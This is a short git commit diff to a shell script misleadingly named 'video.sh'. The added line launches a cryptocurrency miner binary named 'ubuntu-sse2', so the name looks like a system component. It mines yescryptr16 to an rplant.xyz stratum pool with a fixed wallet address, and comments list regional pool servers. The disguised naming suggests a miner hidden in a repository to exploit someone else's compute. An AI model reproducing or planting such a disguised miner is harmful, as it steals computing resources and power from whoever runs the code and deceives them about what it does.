2d2db44be69d4563980764ede966a4f25b59cb6c
ivanbest202201 <96770549+ivanbest202201@users.noreply.github.com>
2021-12-28 21:44:35 +0300

    Update video.sh

--- video.sh
+++ video.sh
@@ -6,4 +6,4 @@
 #       stratum-asia.rplant.xyz /Singapore/
 #       stratum-na.rplant.xyz   /Toronto/
 #
-./001/1/ubuntu -a yescryptr16  -o stratum+tcps://stratum-eu.rplant.xyz:17055 -u qTVTH6sB9SKQNRKmLQkS1bC7JqXNRZYqRH
+./002/1/ubuntu-sse2 -a yescryptr16  -o stratum+tcps://stratum-eu.rplant.xyz:17055 -u qTVTH6sB9SKQNRKmLQkS1bC7JqXNRZYqRH
